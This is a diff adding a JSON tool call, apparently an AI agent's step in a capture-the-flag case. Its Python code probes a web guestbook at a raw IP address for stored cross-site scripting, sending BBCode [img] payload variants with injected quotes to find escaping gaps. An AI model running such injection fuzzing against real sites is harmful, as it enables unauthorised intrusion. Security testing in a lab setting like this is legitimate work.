@@ -1,0 +1,10 @@
+{
+  "tool": "py_run",
+  "arguments": {
+    "code": "\nimport time, urllib.request, urllib.parse, urllib.error\nBASE = \"http://160.202.254.160:15880/\"\nPROXY = {\"http\": \"http://127.0.0.1:12001\", \"https\": \"http://127.0.0.1:12001\"}\nop = urllib.request.build_opener(urllib.request.ProxyHandler(PROXY))\n\ndef get(path=\"\", data=None):\n    d = urllib.parse.urlencode(data).encode() if data is not None else None\n    with op.open(BASE + path, data=d, timeout=20) as r:\n        return r.read().decode(\"gb18030\", \"replace\")\n\nprint(\"[1] GET 是否能写入\")\nbefore = get()\nget(\"?content=GETWRITEZZZ\")\ntime.sleep(0.3)\nafter = get()\nprint(\"    GETWRITEZZZ 出现:\", \"GETWRITEZZZ\" in after)\n\nprint(\"[2] index.php 上 POST 是否同样存储\")\nget(\"index.php\", {\"content\": \"POSTIDXZZZ\"})\ntime.sleep(0.3)\nprint(\"    POSTIDXZZZ 出现:\", \"POSTIDXZZZ\" in get())\n\nprint(\"[3] BBCode 变体矩阵 (看 src 里是否出现未转义的引号)\")\nvariants = [\n    (\"大写\",      \"[IMG]http://a.b/c.png\\\"Z1[/IMG]\"),\n    (\"混合\",      \"[Img]http://a.b/c.png\\\"Z2[/Img]\"),\n    (\"嵌套\",      \"[[img]http://a.b/c.png\\\"Z3[/img]]\"),\n    (\"双开\",      \"[img][img]http://a.b/c.png\\\"Z4[/img]\"),\n    (\"空url\",     \"[img]\\\"Z5[/img]\"),\n    (\"换行\",      \"[img]http://a.b/c.png\\n\\\"Z6[/img]\"),\n    (\"无闭合\",    \"[img]http://a.b/c.png\\\"Z7\"),\n    (\"重复闭\",    \"[img]http://a.b/c.png\\\"Z8[/img][/img]\"),\n]\nfor name, payload in variants:\n    tag = \"V%s\" % payload[payload.find(\"Z\")+1:payload.find(\"Z\")+2]\n    get(\"\", {\"content\": payload})\n    time.sleep(0.25)\n    body = get()\n    i = body.find(\"Z\" + tag[1:])\n    seg = body[max(0,i-160):i+80] if i >= 0 else \"(未找到)\"\n    print(\"  --%s--\" % name)\n    print(\"     输入:\", payload.replace(\"\\n\", \"\\\\n\"))\n    print(\"     输出:\", repr(seg))\n",
+    "timeout": 180,
+    "wp_purpose": "测试GET写入与BBCode变体的转义缺口",
+    "wp_case": "ctf-fca56ff3a53c802b"
+  },
+  "operation_id": "b57f009cec874ce3ab2a47a190febdb9"
+}
